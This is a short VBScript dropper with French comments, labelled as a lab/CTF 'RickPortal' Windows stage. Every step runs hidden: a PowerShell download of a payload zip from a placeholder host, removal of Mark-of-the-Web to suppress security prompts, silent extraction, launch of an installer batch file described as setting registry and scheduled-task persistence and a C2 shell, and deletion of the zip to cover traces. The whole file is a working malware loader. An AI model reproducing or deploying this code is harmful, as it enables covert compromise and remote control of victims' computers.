' RickPortal stage Windows - silencieux total (lab / CTF autorise)
' Double-clic -> wscript, AUCUNE fenetre : download cache, extraction cachee, install cachee
On Error Resume Next
Const C2 = "__C2__"
Const PORT = "__PORT__"
base = "__BASE__"

Set sh  = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
tmp = sh.ExpandEnvironmentStrings("%TEMP%")
zip = tmp & "\rick.zip"
app = sh.ExpandEnvironmentStrings("%APPDATA%") & "\RickPortal"

' 1. download du bundle - fenetre 0 (Run 0 = hidden, True = attendre)
sh.Run "powershell.exe -NoProfile -WindowStyle Hidden -Command ""$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest '" & base & "/RickPortal_win.zip' -OutFile '" & zip & "'""", 0, True

If fso.FileExists(zip) Then
  ' retire le marqueur Zone.Identifier (MOTW) : plus aucun dialogue pour la suite de la chaine
  sh.Run "powershell.exe -NoProfile -WindowStyle Hidden -Command ""Unblock-File '" & zip & "'""", 0, True
  ' 2. extraction cachee dans %TEMP% via Shell.Application
  Set sa = CreateObject("Shell.Application")
  sa.NameSpace(tmp).CopyHere sa.NameSpace(zip).Items, 20
  WScript.Sleep 6000
  ' debloque tout le contenu extrait (exe, bat) - la suite tourne sans dialogue
  sh.Run "powershell.exe -NoProfile -WindowStyle Hidden -Command ""Get-ChildItem '" & tmp & "' -Recurse | Unblock-File""", 0, True
  WScript.Sleep 2000

  ' 3. INSTALLER.bat execute par cmd cache (reg + schtasks + shell C2)
  sh.Run "powershell.exe -NoProfile -WindowStyle Hidden -Command ""Start-Process cmd.exe -ArgumentList '/c ','""" & tmp & "\INSTALLER.bat""' -WindowStyle Hidden""", 0, True

  ' 4. traces du stage effacees
  WScript.Sleep 3000
  fso.DeleteFile zip, True
End If
